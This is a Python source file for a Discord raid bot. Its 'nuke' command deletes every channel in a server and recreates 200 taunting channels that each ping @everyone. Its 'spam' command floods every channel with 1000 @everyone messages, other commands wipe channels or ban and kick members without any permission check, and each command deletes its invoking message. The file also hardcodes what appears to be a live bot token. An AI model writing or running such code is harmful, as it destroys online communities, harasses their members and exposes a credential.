import discord
from discord.ext import commands
import colorama
from colorama import Fore, Back, Style
import asyncio
import time
import random
import discord
from discord.ext import commands
import colorama
from colorama import Fore, Back, Style
import asyncio
from pyfiglet import Figlet
import time
from discord.ext import commands
import random
import self

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='p!', intents=intents)

print("""
Done Bro Bot is logging
""")

channel_names = ["shush", "get raffled", "nuked by trexhausted", "bend over", "hop on","nuked-by-xert", "beamed-by-xert", "nuked", "xert", "cry", "nuked", "LMAO", "xert-runs-all", "1500", "ur-mad", "beamed-by-xert", "BAHAHHA", "1500", "1500", "xert", "clowned"]

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command(name='nuke')
async def create_and_delete_channels(ctx):

    for channel in ctx.guild.channels:
        await channel.delete()


    for i in range(1, 201):
        channel_name = random.choice(channel_names)
        new_channel = await ctx.guild.create_text_channel(f'{channel_name}-{i}')
        await new_channel.send('@everyone nuked by trexhausted')

    await ctx.send('deleted all')
    await ctx.message.delete()
    
@bot.command(name='spam')
async def spam_messages_sent(ctx):
    message = "@everyone trexhausted runs cord"
    for channel in ctx.guild.channels:
        for _ in range(1000):  # Adjust the range based on how many times you want to repeat the message
            await channel.send(message)

    await ctx.send('Sent repeated messages to all channels')

@bot.command(name='res')
async def reset_server_channels(ctx):
    # Delete all current channels
    for channel in ctx.guild.channels:
        await channel.delete()

    # Create a new category and channels
    category = await ctx.guild.create_category('General Category')
    
    await ctx.guild.create_text_channel('general', category=category)
    await ctx.guild.create_text_channel('games', category=category)
    await ctx.guild.create_text_channel('owo', category=category)
    await ctx.guild.create_voice_channel('general', category=category)

    await ctx.send('Server channels reset and new template created with additional channels: general, games, owo')
    await ctx.message.delete()
    
@bot.command(name='boom')
async def delete_old_channel(ctx):
    channel = ctx.channel
    await channel.delete()
    new_channel = await ctx.guild.create_text_channel(name=channel.name)
    await ctx.message.delete()
    
@bot.command('ban')
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

@bot.command('kick')
async def kick(ctx, member : discord.Member):
    await member.kick()
    await ctx.message.delete()

bot.run('MTIzMTY3ODAxNjg0NjAzNzEwNA.GkkXfM.P5FnyUrn5wxWUL4CCtXziEAJ1YquiLCbL7Xn48')